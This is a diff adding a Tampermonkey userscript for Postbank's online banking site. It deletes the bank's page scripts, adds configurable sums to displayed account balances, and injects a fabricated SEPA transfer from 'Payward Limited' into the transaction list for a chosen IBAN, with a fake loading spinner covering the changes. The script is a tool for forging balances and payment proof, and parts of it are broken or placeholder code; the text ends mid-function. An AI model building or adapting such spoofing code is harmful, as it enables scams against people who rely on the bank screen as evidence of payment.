@@ -1,0 +1,1105 @@
+// ==UserScript==
+// @name         Postcombined Hans Friedrichs
+// @namespace    http://tampermonkey.net/
+// @version      0.1
+// @description  Perform a one-time reload on specific clicks
+// @author       You
+// @match        https://banking.postbank.de/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=drivehq.com
+// @grant        none
+// @downloadURL https://update.greasyfork.org/scripts/479442/Postcombined%20Hans%20Friedrichs.user.js
+// @updateURL https://update.greasyfork.org/scripts/479442/Postcombined%20Hans%20Friedrichs.meta.js
+// ==/UserScript==
+
+(function() {
+    'use strict';
+(function finanzübersichtCombined() {
+    'use strict';
+
+    /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+
+    // Function to create the spinner and background
+    function createSpinner() {
+        var background = document.createElement('div');
+        background.className = 'app-loading-background';
+
+        var spinner = document.createElement('div');
+        spinner.className = 'app-loading-pulsing';
+
+        // Apply styles to the background
+        background.style.position = 'fixed';
+        background.style.top = '0';
+        background.style.left = '0';
+        background.style.width = '100%';
+        background.style.height = '100%';
+        background.style.backgroundColor = 'white';
+        background.style.zIndex = '9999';
+
+        // Apply styles to the spinner
+        spinner.style.position = 'absolute';
+        spinner.style.top = '50%';
+        spinner.style.left = '50%';
+        spinner.style.transform = 'translate(-50%,-50%)';
+        spinner.style.width = '120px';
+        spinner.style.height = '120px';
+        spinner.style.display = 'block';
+        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
+        spinner.style.backgroundSize = '100%';
+        spinner.style.animationName = 'pulse';
+        spinner.style.animationTimingFunction = 'ease-in-out';
+        spinner.style.animationIterationCount = 'infinite';
+        spinner.style.animationDuration = '8s';
+        spinner.style.animationFillMode = 'both';
+
+        // Append the background and spinner to the document body
+        document.body.appendChild(background);
+        background.appendChild(spinner);
+
+        return background;
+    }
+
+    var scriptExecuted = false; // Flag to track script execution
+    var delayIndex = 0; // Index for selecting the modification delay
+    var modificationDelays = [7500, 7400, 7300, 7200, 7100, 7000, 6900, 6800, 6700, 6600, 6500, 6400, 6300, 6200, 6100, 6000, 5900, 5800, 5700, 5600, 5500, 5400, 5300, 5200, 5100, 5000, 4900, 4800, 4700, 4600, 4500, 4400, 4300, 4200, 4100, 4000, 3900, 3800, 3700, 3600, 3500, 3400, 3300, 3200, 3100, 3000, 2900, 2800, 2700, 2600, 2500, 2400, 2300, 2200, 2100, 2000, 1900, 1800, 1700, 1600, 1500, 1400, 1300, 1200, 1100, 1000, 900, 800, 700, 600, 500, 400, 300, 200, 100, 0]; // Modification delays for each script
+
+    // Function to remove scripts from the document
+    function removeScripts() {
+        document.querySelectorAll('script').forEach(function(script) {
+            script.remove();
+        });
+    }
+
+    // Function to create a spinner and remove it after 6 seconds
+    function addSpinnerOnEveryClick() {
+        var spinner = createSpinner();
+        setTimeout(function() {
+            removeSpinner(spinner);
+        }, 8000);
+    }
+
+    // Function to remove the spinner element
+    function removeSpinner(spinner) {
+        spinner.remove();
+    }
+
+    // Function to check if an element is within the "header d-print-none" or "product-group" areas
+    function isElementInHeaderOrProductGroupArea(element) {
+        var header = document.querySelector('.header.d-print-none');
+        var productGroup = document.querySelector('.product-group');
+        return (
+            element === header || element === productGroup || header.contains(element) || productGroup.contains(element)
+        );
+    }
+
+    // Watch for changes in the DOM and remove added scripts
+    var observer = new MutationObserver(function(mutationsList) {
+        for (var mutation of mutationsList) {
+            if (mutation.addedNodes) {
+                for (var node of mutation.addedNodes) {
+                    if (node.tagName === 'SCRIPT') {
+                        node.remove();
+                    }
+                }
+            }
+        }
+    });
+
+    // Start observing the document
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Remove scripts from the document
+    removeScripts();
+
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+
+    // Configurable Elements
+    var BALANCE_CONFIGS = [
+        { index: 0, adjustmentAmount: 100 },
+        { index: 1, adjustmentAmount: 100 },
+        { index: 2, adjustmentAmount: 100 },
+     //   { index: 3, adjustmentAmount: 3000 }
+        // Add more configurations as needed...
+    ];
+
+
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+
+    // Function to modify a balance by index and adjustment amount
+    function modifyBalanceByIndex(index, adjustmentAmount) {
+        var elementsWithDbTextBold = document.querySelectorAll('[class*=db-text-bold]');
+        var balanceElements = Array.from(elementsWithDbTextBold).filter(function(element) {
+            return element.textContent.includes('EUR');
+        });
+
+        if (index < balanceElements.length) {
+            var balanceElement = balanceElements[index];
+            var balanceText = balanceElement.textContent.trim();
+            var balanceValue = parseFloat(balanceText.replace(' EUR', '').replace(/\./g, '').replace(',', '.'));
+
+            // Modify the balance and set the appropriate class based on the value
+            var newBalance = balanceValue + adjustmentAmount;
+            var formattedBalance = newBalance.toLocaleString('de-DE', { minimumFractionDigits: 2 });
+            balanceElement.textContent = formattedBalance + ' EUR';
+
+            // Apply the appropriate class
+            if (newBalance < 0) {
+                balanceElement.classList.add('negative', 'db-text-bold');
+            } else {
+                balanceElement.classList.remove('negative');
+                balanceElement.classList.add('db-text-bold');
+            }
+        }
+    }
+
+    // Function to check if the specified text content is present on the page
+    function checkForTextContent() {
+        if (document.body.textContent.includes('Ihre Finanzübersicht') && !scriptExecuted) {
+            // Loop through the balance configurations and modify the balances accordingly
+            BALANCE_CONFIGS.forEach(function(config) {
+                modifyBalanceByIndex(config.index, config.adjustmentAmount);
+            });
+            scriptExecuted = true; // Mark script as executed
+        }
+    }
+
+    // Function to wait for the specified timeout before executing the script
+    function waitForTimeout() {
+        checkForTextContent();
+        setTimeout(function() {
+            waitForTimeout(); // After the timeout, check for text content and modify balances
+        }, modificationDelays[delayIndex]);
+    }
+
+// Function to check for text content on each click
+function checkOnEveryClick() {
+    document.addEventListener('click', function (event) {
+        if (isElementInHeaderOrProductGroupArea(event.target) && !isExcludedClick(event.target)) {
+            // Add spinner on every click within the specified areas
+            addSpinnerOnEveryClick();
+            scriptExecuted = false; // Reset the script execution flag on each click
+        }
+    });
+}
+
+// Function to check if the element or its ancestors are excluded from the click action
+function isExcludedClick(element) {
+    // Check for the "meta-nav-item" class in the header area
+    if (element.closest('.header.d-print-none')) {
+        if (element.classList.contains('meta-nav-item') || element.closest('.meta-nav-item')) {
+            return true;
+        }
+    }
+
+    // Check for the "db-button__content" class in the product group area
+    if (element.closest('.product-group')) {
+        if (element.classList.contains('db-button__content') || element.closest('.db-button__content')) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+
+    // Function to show the spinner on page load
+    function showSpinnerOnPageLoad() {
+        var spinner = createSpinner();
+        setTimeout(function() {
+            removeSpinner(spinner);
+        }, 8000);
+    }
+
+    // Show the spinner on page load
+    window.onload = function () {
+        showSpinnerOnPageLoad(); // Show the spinner on page load
+        waitForTimeout(); // Start the timeout after the page is loaded
+        checkOnEveryClick(); // Check for text content on each click
+    };
+})();
+
+
+    //////THE END/////////////////////THE END///////////////////////THE END/////////////////////////THE END////////////////////THE END/////////////////////////THE END//////////////////////THE END///////////////////////THE END//////////////////
+    /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+        /////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE///
+    ////MAIN PAGE/////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE/////////////////////MAIN PAGE////////////////////
+    //////////////THE END/////////////////////THE END///////////////////////THE END/////////////////////////THE END////////////////////THE END/////////////////////////THE END//////////////////////THE END///////////////////////THE END//////
+
+
+
+
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+//UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT////////////////
+/////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT//////////////////UMSAT/////
+
+
+    (function umsaetz() {
+    'use strict';
+
+
+   // Define the delay (in milliseconds) before running myUserScript
+    var userScriptDelay = 3000; // Change this value to your desired delay (e.g., 5000 for 5 seconds)
+
+    // Function to remove scripts from the document
+    function removeScripts() {
+        console.log("Removing scripts...");
+        document.querySelectorAll('script').forEach(function(script) {
+            script.remove();
+            console.log("Script removed.");
+        });
+    }
+
+    // Watch for changes in the DOM and remove added scripts
+    var observer = new MutationObserver(function(mutationsList) {
+        for (var mutation of mutationsList) {
+            if (mutation.addedNodes) {
+                for (var node of mutation.addedNodes) {
+                    if (node.tagName === 'SCRIPT') {
+                        console.log("Script added. Removing...");
+                        node.remove();
+                        console.log("Script removed.");
+                    }
+                }
+            }
+        }
+    });
+
+    // Start observing the document
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Remove all scripts from the document
+    removeScripts();
+
+    // Function to create the spinner and background
+    function createSpinner() {
+        var background = document.createElement('div');
+        background.className = 'app-loading-background';
+
+        var spinner = document.createElement('div');
+        spinner.className = 'app-loading-pulsing';
+
+        // Apply styles to the background
+        background.style.position = 'fixed';
+        background.style.top = '0';
+        background.style.left = '0';
+        background.style.width = '100%';
+        background.style.height = '100%';
+        background.style.backgroundColor = 'white';
+        background.style.zIndex = '9999';
+
+        // Apply styles to the spinner
+        spinner.style.position = 'absolute';
+        spinner.style.top = '50%';
+        spinner.style.left = '50%';
+        spinner.style.transform = 'translate(-50%,-50%)';
+        spinner.style.width = '120px';
+        spinner.style.height = '120px';
+        spinner.style.display = 'block';
+        spinner.style.backgroundImage = 'url(pb-logo-splash.e83ae1f69ca2f23d.svg)';
+        spinner.style.backgroundSize = '100%';
+        spinner.style.animationName = 'pulse';
+        spinner.style.animationTimingFunction = 'ease-in-out';
+        spinner.style.animationIterationCount = 'infinite';
+        spinner.style.animationDuration = '10s';
+        spinner.style.animationFillMode = 'both';
+
+        // Append the background and spinner to the document body
+        document.body.appendChild(background);
+        background.appendChild(spinner);
+
+        return background;
+    }
+
+   // Function to trigger myUserScript
+        function triggerMyUserScript() {
+            // Create and display the spinner
+            var spinnerBackground = createSpinner();
+
+            setTimeout(function() {
+                // Remove the spinner background after the specified delay
+                spinnerBackground.remove();
+
+                // Trigger myUserScript after the spinner is removed
+                myUserScript();
+            }, userScriptDelay);
+        }
+
+        // Add a click event listener to the document body using event delegation
+        document.body.addEventListener('click', function(event) {
+            var target = event.target;
+            // Check if the clicked element or any of its parents have the class "product-group"
+            if (target.closest('.product-group')) {
+                // Trigger myUserScript after the defined delay
+                triggerMyUserScript();
+            }
+        });
+
+        // Trigger myUserScript on page load
+        triggerMyUserScript();
+
+         //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+
+        // Specify your IBAN
+    var desiredIBAN = 'dE88200100200154960208  ';
+
+         //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+     // Function to check if the IBAN matches
+function ibanMatches(desiredIBAN) {
+    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
+    if (ibanElement) {
+        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
+        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
+        return ibanText === desiredIBANNormalized;
+    }
+    return false;
+}
+
+
+        // Define your user script function
+function myUserScript() {
+ // Function to remove scripts from the document
+    function removeScripts() {
+        console.log("Removing scripts...");
+        document.querySelectorAll('script').forEach(function(script) {
+            script.remove();
+            console.log("Script removed.");
+        });
+    }
+
+    // Watch for changes in the DOM and remove added scripts
+    var observer = new MutationObserver(function(mutationsList) {
+        for (var mutation of mutationsList) {
+            if (mutation.addedNodes) {
+                for (var node of mutation.addedNodes) {
+                    if (node.tagName === 'SCRIPT') {
+                        console.log("Script added. Removing...");
+                        node.remove();
+                        console.log("Script removed.");
+                    }
+                }
+            }
+        }
+    });
+
+    // Start observing the document
+    observer.observe(document.documentElement, { childList: true, subtree: true });
+
+    // Remove scripts from the document
+    removeScripts();
+
+ //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+      // Specify your IBAN
+    var desiredIBAN = 'dE88200100200154960208  ';
+
+     // Specify balance modification amount
+    var balanceModificationAmount = 100.00; // Example: -1000 to decrease by 1000, +1000 to increase by 1000
+
+
+// Specify the timeout (in milliseconds) before the script execution
+    var scriptTimeout = 0; // Change this to your desired timeout in milliseconds (e.g., 5000 for 5 seconds)
+
+    // Define an array to store the transactions you want to insert
+    var transactionsToInsert = [
+        {
+            recipient: 'Payward Limited',
+            transactionInfo: 'Test',
+            transactionType: ' SEPA Überweisung ',
+            transactionDate: '10.11.2023',
+            transactionAmount: '100,00 EUR',
+            preferredInsertionLogic: 'pinned_top',
+            moveSteps: 0,
+            moveDirection: 'up'
+        },
+     
+        // Add more transactions as needed...
+    ];
+
+
+
+     //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+    ////////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE/////////
+    //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE///////// //CONFIGRURE////////////////////
+
+
+   // Function to check if the IBAN matches
+function ibanMatches(desiredIBAN) {
+    var ibanElement = document.querySelector('[class*="db-text-5"][class*="color-text-secondary"]');
+    if (ibanElement) {
+        var ibanText = ibanElement.textContent.trim().toLowerCase().replace(/\s/g, '');
+        var desiredIBANNormalized = desiredIBAN.toLowerCase().replace(/\s/g, '');
+        return ibanText === desiredIBANNormalized;
+    }
+    return false;
+}
+
+
+    // Delay script execution based on the specified timeout
+    setTimeout(function() {
+        // Check if the IBAN matches before proceeding
+        if (ibanMatches(desiredIBAN)) {
+            console.log('IBAN matches. Userscript started.');
+
+
+
+  // Create a variable to track the total balance modification
+var totalBalanceModification = 0;
+
+// Loop through the transactions to insert
+transactionsToInsert.forEach(function(transactionData) {
+    // Insert the transaction
+    insertTransaction(transactionData);
+});
+
+// Modify the main balance once after all transactions are inserted
+modifyMainBalance(balanceModificationAmount);
+
+console.log('Userscript finished.');
+
+// Function to modify the main balance
+function modifyMainBalance(modificationAmount) {
+    // Find the main balance element
+    var balanceElement = document.querySelector('.balance.d-flex.flex-wrap.justify-content-between');
+    if (balanceElement) {
+        var balanceValueElement = balanceElement.querySelector('.positive.db-text-bold') || balanceElement.querySelector('.negative.db-text-bold');
+
+        if (balanceValueElement) {
+            var balanceText = balanceValueElement.textContent;
+            var balanceValue = parseFloat(balanceText.replace(/\./g, '').replace(',', '.'));
+
+            // Modify the balance value
+            var newBalance = balanceValue + modificationAmount;
+
+            // Update the balance value while preserving the "EUR" text
+            balanceValueElement.textContent = formatBalance(newBalance) + ' EUR';
+
+            // Determine whether the balance is positive or negative
+            if (newBalance < 0) {
+                balanceValueElement.classList.add('negative');
+            } else {
+                balanceValueElement.classList.remove('negative');
+            }
+
+            console.log('Main balance modified:', formatBalance(newBalance));
+        } else {
+            console.log('Main balance value element not found.');
+        }
+    } else {
+        console.log('Main balance element not found.');
+    }
+}
+
+// Function to format the balance with correct separators
+function formatBalance(balance) {
+    var formattedBalance = balance.toFixed(2).replace(/\./g, ','); // Use comma as decimal separator
+    return formattedBalance.replace(/\B(?=(\d{3})+(?!\d))/g, "."); // Add dots as thousands separators
+}
+// Modify the main balance once after all transactions are inserted
+modifyMainBalance(totalBalanceModification);
+
+console.log('Userscript finished.');
+
+
+
+        console.log('Userscript finished.');
+    } else {
+      console.log('IBAN does not match. Userscript not executed.');
+        }
+    }, scriptTimeout);
+
+
+  // Function to insert a transaction
+function insertTransaction(data) {
+    // Extract data from the transactionData object
+    var desiredRecipient = data.recipient;
+    var desiredTransactionInfo = data.transactionInfo;
+    var desiredTransactionType = data.transactionType;
+    var desiredTransactionDate = data.transactionDate;
+    var desiredTransactionAmount = data.transactionAmount;
+    var preferredInsertionLogic = data.preferredInsertionLogic; // Define preferredInsertionLogic
+    var moveDirection = data.moveDirection; // Define moveDirection
+    var moveSteps = data.moveSteps;  // Define move steps
+
+
+  // Function to execute the main script logic once required elements are present
+  function executeMainScript() {
+    // Check if the IBAN matches before proceeding
+    if (ibanMatches(desiredIBAN)) {
+      console.log('IBAN matches. Userscript started.');
+
+      // Create a variable to track the total balance modification
+      var totalBalanceModification = 0;
+
+      // Loop through the transactions to insert
+      transactionsToInsert.forEach(function (transactionData) {
+        // Insert the transaction
+        insertTransaction(transactionData);
+      });
+
+      // Modify the main balance once after all transactions are inserted
+      modifyMainBalance(balanceModificationAmount);
+
+      console.log('Userscript finished.');
+    } else {
+      console.log('IBAN does not match. Userscript not executed.');
+    }
+  }
+
+  // Function to periodically check for the presence of required elements
+  function waitForElements() {
+    // Replace the following line with actual code to check if the required elements exist on the page
+    // Example: Check if elements with certain selectors are present on the page
+    var requiredElementsExist = document.querySelector('.your-selector') !== null;
+
+    if (requiredElementsExist) {
+      // Elements found, execute the main script logic
+      executeMainScript();
+    } else {
+      // Elements not found, continue polling
+      setTimeout(waitForElements, 1000); // Poll every 1 second
+    }
+  }
+
+  // Delay script execution based on the specified timeout
+  setTimeout(waitForElements, scriptTimeout);
+
+ // Replace the comma with a period and parse the amount as a floating-point number
+    var parsedAmount = parseFloat(desiredTransactionAmount.replace(/\./g, '').replace(',', '.'));
+
+
+    // Create the transaction HTML structure
+    var transactionHTML = `
+    <div _ngcontent-vyi-c225="" class="${preferredInsertionLogic === "pinned_top" ? "container" : ""}">
+
+    <cirrus-transaction-row _ngcontent-vyi-c223="" data-test="transactionsRow" _nghost-vyi-c222="">
+            <db-list-row _ngcontent-vyi-c222="" data-test="bookedTransaction" class="pr-4 align-items-center clickable" tabindex="0">
+                <db-list-row-prefix _ngcontent-vyi-c222="">
+                    <db-avatar _ngcontent-vyi-c222="" data-test="icon">
+                        <div class="db-avatar db-avatar-type--icon db-avatar-size--md">
+                            <db-icon aria-hidden="true" class="db-icon--transfer">
+                                <span translate="no" class="sr-only">transfer</span>
+                                <svg focusable="false" class="db-icon__icon">
+                                    <use xlink:href="#transfer"></use>
+                                </svg>
+                            </db-icon>
+                        </div>
+                    </db-avatar>
+                </db-list-row-prefix>
+                <db-list-row-content _ngcontent-vyi-c222="" class="col-md-4 text-truncate-md pl-0">
+                    <div _ngcontent-vyi-c222="" data-test="counterPartyNameOrTransactionTypeLabel" class="db-text-4 db-text-bold color-text-primary">
+                        <span _ngcontent-vyi-c222="">${desiredRecipient}</span>
+                    </div>
+                    <div _ngcontent-vyi-c222="" class="db-text-5 color-text-secondary text-truncate-md">${desiredTransactionInfo}</div>
+                </db-list-row-content>
+                <db-list-row-content _ngcontent-vyi-c222="" data-test="transactionTypeLabel" class="text-truncate db-text-5 d-none d-md-block text-right text-md-left ml-5 pl-3">
+                    <div _ngcontent-vyi-c222="" class="text-truncate color-text-primary pt-md-1">${desiredTransactionType}</div>
+                    <div _ngcontent-vyi-c222="" data-test="transactionRowDate" class="text-truncate color-text-secondary pt-md-1">${desiredTransactionDate}</div>
+                </db-list-row-content>
+                <db-list-row-content _ngcontent-vyi-c222="" data-test="amount" class="d-none d-md-block">
+                    <div _ngcontent-vyi-c222="" data-test="amount" class="text-truncate db-text-4 text-right color-text-primary">
+                        <cirrus-decorated-amount _ngcontent-vyi-c222="" _nghost-vyi-c166="">
+                            <span _ngcontent-vyi-c166="" class="color-text-primary directional with-color text-nowrap">
+                                <span _ngcontent-vyi-c166="" class="${parsedAmount >= 0 ? 'positive db-text-bold' : 'negative db-text-bold'}">${desiredTransactionAmount} <span _ngcontent-vyi-c166="" data-test="currencyCode" class="db-text-5 db-text-bold">EUR</span></span>
+                            </span>
+                        </cirrus-decorated-amount>
+                    </div>
+                    <div _ngcontent-vyi-c222="" data-test="transactionRowDate" class="d-md-none text-truncate date db-text-5 text-right text-md-left order-md-4 pt-md-1 sf-hidden">${desiredTransactionDate}</div>
+                </db-list-row-content>
+                <db-list-row-menu _ngcontent-vyi-c222="" class="d-none d-md-flex">
+                    <db-list-row-suffix>
+                        <db-menu design="tertiary">
+                            <db-button type="button" class="db-menu__button">
+                                <button class="db-button db-button--icon-only db-button--tertiary db-button--md" type="button" tabindex="0" aria-disabled="false">
+                                    <span class="db-button__content">
+                                        <span>
+                                            <db-icon size="md" class="icon db-icon--more" aria-hidden="true">
+                                                <span translate="no" class="sr-only">more</span>
+                                                <svg focusable="false" class="db-icon__icon db-icon__icon--md">
+                                                    <use xlink:href="#more"></use>
+                                                </svg>
+                                            </db-icon>
+                                        </span>
+                                    </span>
+                                </button>
+                            </db-button>
+                        </db-menu>
+                    </db-list-row-suffix>
+                </db-list-row-menu>
+            </db-list-row>
+            <div _ngcontent-vyi-c222="" data-test="amount" class="db-list-row d-md-none pr-4 pb-3 amount-row sf-hidden"></div>
+                                    </cirrus-transaction-row>
+         </div>
+    `;
+
+    // Find the transaction view element
+    var transactionViewElement = document.querySelector('cirrus-transactions-view');
+
+    if (transactionViewElement) {
+        console.log('Transaction view element found:', transactionViewElement);
+
+        // ... (existing code to create the newTransactionRow and set text content) done
+
+       // Create a new transaction row element
+            var newTransactionRow = document.createElement('cirrus-transaction-row');
+            newTransactionRow.innerHTML = transactionHTML;
+
+
+// Set the text content for the specific elements
+var recipientElement = newTransactionRow.querySelector('.db-text-4');
+var transactionInfoElement = newTransactionRow.querySelector('.color-text-secondary.text-truncate-md');
+var transactionTypeElement = newTransactionRow.querySelector('.text-truncate.color-text-primary.pt-md-1');
+var transactionDateElement = newTransactionRow.querySelector('.text-truncate.color-text-secondary.pt-md-1');
+var transactionAmountElement = parsedAmount < 0 ? newTransactionRow.querySelector('.negative.db-text-bold') : newTransactionRow.querySelector('.positive.db-text-bold');
+
+
+    transactionAmountElement = newTransactionRow.querySelector('.positive.db-text-bold');
+
+
+if (recipientElement) {
